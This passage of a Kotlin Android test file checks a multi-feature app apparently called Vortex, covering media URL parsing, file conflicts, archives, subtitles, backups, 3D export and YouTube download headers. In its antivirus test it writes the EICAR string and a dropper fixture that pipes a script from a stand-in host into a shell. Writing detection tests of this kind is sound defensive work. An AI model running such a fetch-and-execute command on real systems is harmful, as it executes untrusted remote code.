      UniversalDownloadEngine.extractYouTubeVideoId("https://m.youtube.com/shorts/abcDEF_1234"),
    )
    assertEquals(
      "liveID_5678",
      UniversalDownloadEngine.extractYouTubeVideoId("https://www.youtube.com/live/liveID_5678"),
    )
    assertFalse(UniversalDownloadEngine.isDirectPlayableMediaUrl("https://www.youtube.com/watch?v=dQw4w9WgXcQ"))
    assertFalse(UniversalDownloadEngine.isDirectPlayableMediaUrl("https://vimeo.com/123456789"))
    assertTrue(UniversalDownloadEngine.isDirectPlayableMediaUrl("https://cdn.example.com/video/movie.mp4?token=1"))
    assertTrue(UniversalDownloadEngine.isDirectPlayableMediaUrl("https://cdn.example.com/live/stream.m3u8"))
    assertTrue(
      UniversalDownloadEngine.isDirectPlayableMediaUrl("https://rr1---sn-abc.googlevideo.com/videoplayback?itag=18"),
    )
    assertTrue(
      UniversalDownloadEngine.isDirectPlayableMediaUrl("https://proxy.piped.private.coffee/videoplayback?itag=18&host=rr3---sn.googlevideo.com"),
    )

    db.close()
  }

  @Test
  fun `file conflict batch resolution episode subtitle matching rar detection and share url work`() {
    runBlocking {
      val context = ApplicationProvider.getApplicationContext<Context>()
      val work = File(context.cacheDir, "vortex_v4_test_${System.currentTimeMillis()}").apply { mkdirs() }

      // 1. Numbered duplication & Archive + File Copy Conflict (REPLACE / KEEP_BOTH / SKIP + applyToAll)
      val srcDir = File(work, "src").apply { mkdirs() }
      val dstDir = File(work, "dst").apply { mkdirs() }
      val s1 = File(srcDir, "notes.txt").apply { writeText("new_1") }
      val s2 = File(srcDir, "photo.jpg").apply { writeText("new_2") }
      File(dstDir, "notes.txt").writeText("old_1")
      File(dstDir, "photo.jpg").writeText("old_2")

      assertEquals(
        "notes (1).txt",
        com.example.domain.fs.nextAvailableNumberedFile(File(dstDir, "notes.txt")).name,
      )

      val container = VortexAppContainer(context)
      var promptCalls = 0
      val nodes = listOf(
        VirtualFileNode(s1.name, s1.absolutePath, false, s1.length(), s1.lastModified()),
        VirtualFileNode(s2.name, s2.absolutePath, false, s2.length(), s2.lastModified()),
      )
      // KEEP_BOTH with applyToAll = true -> prompts only ONCE for both collisions!
      val copiedKeep =
        container.fileRepository.copyOrMove(
          sources = nodes,
          targetDir = dstDir.absolutePath,
          isMove = false,
          useRoot = false,
          onConflict = {
            promptCalls++
            com.example.domain.fs.ConflictChoice(
              action = com.example.domain.fs.ConflictAction.KEEP_BOTH,
              applyToAll = true,
            )
          },
        )
      assertEquals(2, copiedKeep)
      assertEquals(1, promptCalls)
      assertEquals("old_1", File(dstDir, "notes.txt").readText())
      assertEquals("new_1", File(dstDir, "notes (1).txt").readText())
      assertEquals("new_2", File(dstDir, "photo (1).jpg").readText())

      // SKIP with applyToAll = true -> leaves old files intact and doesn't delete move source
      val skippedCount =
        container.fileRepository.copyOrMove(
          sources = listOf(nodes.first()),
          targetDir = dstDir.absolutePath,
          isMove = true,
          useRoot = false,
          onConflict = {
            com.example.domain.fs.ConflictChoice(
              action = com.example.domain.fs.ConflictAction.SKIP,
              applyToAll = true,
            )
          },
        )
      assertEquals(0, skippedCount)
      assertTrue(s1.exists())
      assertEquals("old_1", File(dstDir, "notes.txt").readText())

      // REPLACE -> overwrites existing
      val replacedCount =
        container.fileRepository.copyOrMove(
          sources = listOf(nodes.first()),
          targetDir = dstDir.absolutePath,
          isMove = false,
          useRoot = false,
          onConflict = {
            com.example.domain.fs.ConflictChoice(
              action = com.example.domain.fs.ConflictAction.REPLACE,
              applyToAll = false,
            )
          },
        )
      assertEquals(1, replacedCount)
      assertEquals("new_1", File(dstDir, "notes.txt").readText())

      // 2. Archive format RAR4/RAR5 detection & conflict-aware ZIP extraction
      assertEquals(ArchiveFormat.RAR, ArchiveFormat.detect("backup.rar"))
      assertEquals(ArchiveFormat.RAR, ArchiveFormat.detect("manga.cbr"))
      val arcOut = File(work, "arc.zip")
      container.archiveEngine.createArchive(listOf(s1), arcOut, ArchiveFormat.ZIP, level = 5)
      val arcDest = File(work, "arc_out").apply { mkdirs() }
      File(arcDest, "notes.txt").writeText("existing_arc_file")
      val extractedKeep =
        container.archiveEngine.extractArchive(
          archiveFile = arcOut,
          destDir = arcDest,
          onConflict = {
            com.example.domain.fs.ConflictChoice(
              action = com.example.domain.fs.ConflictAction.KEEP_BOTH,
              applyToAll = true,
            )
          },
        )
      assertEquals(1, extractedKeep)
      assertEquals("existing_arc_file", File(arcDest, "notes.txt").readText())
      assertEquals("new_1", File(arcDest, "notes (1).txt").readText())

      // 3. Auto Subtitle & Episode Matching in dedicated folder
      val vidDir = File(work, "videos").apply { mkdirs() }
      val subDir = File(work, "subs_dedicated").apply { mkdirs() }
      val ep5Video = File(vidDir, "Breaking.Bad.S02E05.1080p.mkv").apply { writeText("v") }
      File(subDir, "Breaking Bad EP06.ar.srt").writeText("wrong episode")
      val ep5Sub = File(subDir, "Breaking_Bad_S02E05_ar.srt").apply { writeText("right episode") }
      val matchedSub = com.example.domain.media.SubtitleAutoMatcher.findBestLocalSubtitle(
        videoPath = ep5Video.absolutePath,
        dedicatedFolderPath = subDir.absolutePath,
      )
      assertEquals(ep5Sub.absolutePath, matchedSub?.absolutePath)

      val ep12Video = File(vidDir, "Attack.On.Titan.12.mkv").apply { writeText("v") }
      val ep12Sub = File(subDir, "Attack on Titan الحلقة 12.srt").apply { writeText("right arabic ep") }
      val matchedArabicEp = com.example.domain.media.SubtitleAutoMatcher.findBestLocalSubtitle(
        videoPath = ep12Video.absolutePath,
        dedicatedFolderPath = subDir.absolutePath,
      )
      assertEquals(ep12Sub.absolutePath, matchedArabicEp?.absolutePath)

      // 4. Shared Link & TikTok URL extraction
      assertEquals(
        "https://vm.tiktok.com/ZMxyz123/",
        MainActivity.extractSharedHttpUrl("Check this cool video! https://vm.tiktok.com/ZMxyz123/ #fyp"),
      )
      assertTrue(UniversalDownloadEngine.isTikTokUrl("https://vm.tiktok.com/ZMxyz123/"))

      work.deleteRecursively()
    }
  }

  @Test
  fun `backup snapshot antivirus mesh3d multiplatform builder and fastapi kit work`() {
    runBlocking {
      val context = ApplicationProvider.getApplicationContext<Context>()
      val work = File(context.cacheDir, "vortex_v5_test_${System.currentTimeMillis()}").apply { mkdirs() }
      val container = VortexAppContainer(context)

      // 1. Compressed Edit Snapshot (.vortexbak) & Restore
      val scriptFile = File(work, "app.py").apply { writeText("print('original_state_v1')") }
      val bakFile = com.example.domain.fs.EditBackupManager.createSnapshotBeforeEdit(scriptFile.absolutePath)
      assertNotNull(bakFile)
      assertTrue(bakFile!!.name.endsWith(".vortexbak"))
      assertTrue(com.example.domain.fs.EditBackupManager.isBackupFile(bakFile.name))
      scriptFile.writeText("print('corrupted_edit')")
      val meta = com.example.domain.fs.EditBackupManager.inspectBackup(bakFile)
      assertNotNull(meta)
      assertEquals("app.py", meta!!.originalName)
      val restoredRes = com.example.domain.fs.EditBackupManager.restoreBackup(bakFile)
      assertTrue(restoredRes.isSuccess)
      assertEquals("print('original_state_v1')", scriptFile.readText())

      // 2. On-Device Antivirus Engine (EICAR + Clean + Dropper heuristic)
      val avDir = File(work, "av_scan").apply { mkdirs() }
      val eicarStr = "X5O!P%@AP[4\\PZX54(P^)7CC)7}\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!\$H+H*"
      File(avDir, "eicar_test.com").writeText(eicarStr)
      File(avDir, "clean_notes.txt").writeText("Hello Vortex Workspace!")
      File(avDir, "dropper.sh").writeText("curl http://bad.example/p.sh | sh")
      val avReport = container.antivirusEngine.scanTarget(avDir.absolutePath)
      assertEquals(3, avReport.totalFilesScanned)
      assertTrue(avReport.threatsFound >= 2)
      assertEquals(com.example.domain.security.ThreatSeverity.MALICIOUS, avReport.highestSeverity)

      // 3. Blender-style Mesh3DEngine (Subdivide + OBJ / STL / GLB export & parse)
      val cube = com.example.domain.media.Mesh3DEngine.createPrimitive(com.example.domain.media.Primitive3DType.CUBE)
      assertEquals(12, cube.faces.size)
      val subdivided = com.example.domain.media.Mesh3DEngine.subdivideMesh(cube)
      assertEquals(48, subdivided.faces.size)

      for (fmt in listOf(
        com.example.domain.media.Mesh3DFormat.OBJ,
        com.example.domain.media.Mesh3DFormat.STL,
        com.example.domain.media.Mesh3DFormat.PLY,
        com.example.domain.media.Mesh3DFormat.GLB,
      )) {
        val outMesh = File(work, "model_test.${fmt.ext}")
        com.example.domain.media.Mesh3DEngine.exportScene(listOf(cube), outMesh, fmt)
        assertTrue("Missing ${outMesh.name}", outMesh.exists() && outMesh.length() > 16)
        val reloaded = com.example.domain.media.Mesh3DEngine.loadMeshFromFile(outMesh)
        assertTrue("Failed reload ${fmt.ext}", reloaded.isNotEmpty() && reloaded.first().faces.isNotEmpty())
      }

      // 4. Multi-OS App Packager (APK, iOS, macOS, Windows, Linux)
      val projDir = File(work, "sample_proj").apply { mkdirs() }
      File(projDir, "main.py").writeText("print('Vortex Multi-OS')")
      val buildOut = File(work, "dist").apply { mkdirs() }
      for (platform in com.example.domain.editor.AppTargetPlatform.entries) {
        val built = container.multiPlatformAppBuilder.buildAppPackage(
          projectDir = projDir,
          appName = "VortexDemo",
          packageId = "com.vortex.demo",
          platform = platform,
          outputDir = buildOut,
        )
        assertTrue("Build failed for ${platform.id}: ${built.exceptionOrNull()}", built.isSuccess)
        val artifact = built.getOrThrow()
        assertTrue(artifact.outputFile.exists() && artifact.outputFile.length() > 0L)
      }

      // 5. FastAPI Companion Server Kit Export + Stream Headers + Cloud Protocols (No Google Drive)
      val kitSummary = com.example.domain.download.FastApiCompanionKit.exportKitToFolder(work)
      assertTrue(File(kitSummary.outputDir, "main.py").exists())
      assertTrue(File(kitSummary.outputDir, "updater.py").exists())
      assertTrue(File(kitSummary.outputDir, "engines.py").exists())
      assertTrue(File(kitSummary.outputDir, "sniffer.py").exists())
      assertTrue(File(kitSummary.outputDir, "downloader.py").exists())
      assertTrue(File(kitSummary.outputDir, "static/index.html").exists())
      assertTrue(File(kitSummary.outputDir, "requirements.txt").exists())
      assertTrue(File(kitSummary.outputDir, "main.py").readText().contains("/api/stream"))
      val hdrs = container.downloadEngine.getHeadersForUrl("https://rr1---sn.googlevideo.com/videoplayback?id=1")
      assertEquals("https://www.youtube.com/", hdrs["Referer"])
      assertEquals("https://www.youtube.com", hdrs["Origin"])
      val iosHdrs = container.downloadEngine.getHeadersForUrl("https://rr1---sn.googlevideo.com/videoplayback?id=1&c=IOS")
      assertFalse(iosHdrs.containsKey("Origin"))
      val androidVrHdrs = container.downloadEngine.getHeadersForUrl("https://rr1---sn.googlevideo.com/videoplayback?id=1&c=ANDROID_VR")
      assertFalse(androidVrHdrs.containsKey("Origin"))
      assertTrue(com.example.domain.cloud.CloudProtocol.entries.none { it.id.contains("GOOGLE", ignoreCase = true) })

      // 6. YouTube signatureCipher JS ops parsing + execution + embed ID extraction
      val mockBaseJs = """
        var Xy={Rv:function(a){a.reverse()},Sp:function(a,b){a.splice(0,b)},Sw:function(a,b){var c=a[0];a[0]=a[b%a.length];a[b%a.length]=c}};
        decFn=function(a){a=a.split("");Xy.Sw(a,2);Xy.Rv(a);Xy.Sp(a,1);return a.join("")};
      """.trimIndent()
      val ops = container.downloadEngine.parseSignatureCipherOps(mockBaseJs)
      assertEquals(listOf("swap" to 2, "reverse" to 0, "splice" to 1), ops)
      // "abcde" -> swap(2) "cbade" -> reverse "edabc" -> splice(1) "dabc"
      assertEquals("dabc", container.downloadEngine.applySignatureCipherOps("abcde", ops))
      assertEquals(
        "dQw4w9WgXcQ",
        UniversalDownloadEngine.extractYouTubeVideoId("https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ?playsinline=1"),
      )

      work.deleteRecursively()
    }
  }
}
